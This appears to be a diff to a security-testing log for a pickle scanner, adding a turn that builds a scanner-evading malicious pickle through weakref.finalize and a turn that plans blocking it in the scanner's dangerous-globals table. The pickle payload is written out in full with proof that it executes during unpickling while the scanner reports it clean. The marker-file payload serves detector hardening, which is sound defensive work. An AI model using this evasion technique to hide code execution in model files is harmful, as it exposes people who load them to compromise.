@@ -1287,3 +1287,93 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add exit-handler simulation, callback-flow analysis,
 or broader string scanning.
+
+## Turn 33 - `weakref.finalize` reclaim-time callback gap
+
+Goal: produce another aggressive RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_weakref_finalize_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("weakref", "finalize"),
+        sg("collections", "UserList"),
+        b")R",
+        sg("pathlib", "Path.touch"),
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_weakref_finalize_marker"),
+        b"tR",
+        b"\x87R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`
+- Scanner import references:
+  `weakref.finalize`, `collections.UserList`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`, all with `is_dangerous=False`
+- Unpickle result: creates `/tmp/ma_weakref_finalize_marker` before
+  `pickle.loads()` returns and returns a dead `weakref.finalize` object
+- RCE mechanism: `weakref.finalize(obj, func, *args)` stores an
+  attacker-selected callback and attacker-controlled arguments that execute
+  when `obj` is reclaimed. The pickle constructs a temporary
+  `collections.UserList()` object as the watched object, passes
+  `pathlib.Path.touch(marker)` as the finalizer callback, and does not preserve
+  any other strong reference to the watched object. CPython reclaims the object
+  during unpickling, so the finalizer callback fires immediately.
+
+Why the scanner missed it:
+
+- `weakref` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `weakref.finalize`,
+  `collections.UserList`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another arbitrary-callback sink, but the trigger is
+object reclamation rather than explicit iteration or interpreter shutdown. The
+narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
+`("weakref", "finalize")`, plus a regression that proves the callback executes
+before `pickle.loads()` returns. The hot path remains a static policy lookup.
+
+## Turn 34 - Block `weakref.finalize`
+
+Blocking plan:
+
+- Add `("weakref", "finalize")` to the sorted Rust `DANGEROUS_GLOBALS` table.
+  `collections.UserList` and `pathlib.Path.touch` stay allowed because
+  `weakref.finalize` is the arbitrary-callback sink that wires the watched
+  object, callback, and attacker-controlled callback arguments together.
+- Add portable policy coverage for raw `GLOBAL weakref finalize` reductions so
+  detection does not depend on object-reclamation timing.
+- Add a CPython oracle regression that manually builds
+  `weakref.finalize(collections.UserList(), pathlib.Path.touch, marker)`,
+  verifies scanner detection, then proves the marker appears before
+  `pickle.loads()` returns.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add lifetime simulation, weakref-specific stack
+analysis, or broader callback-flow tracking.
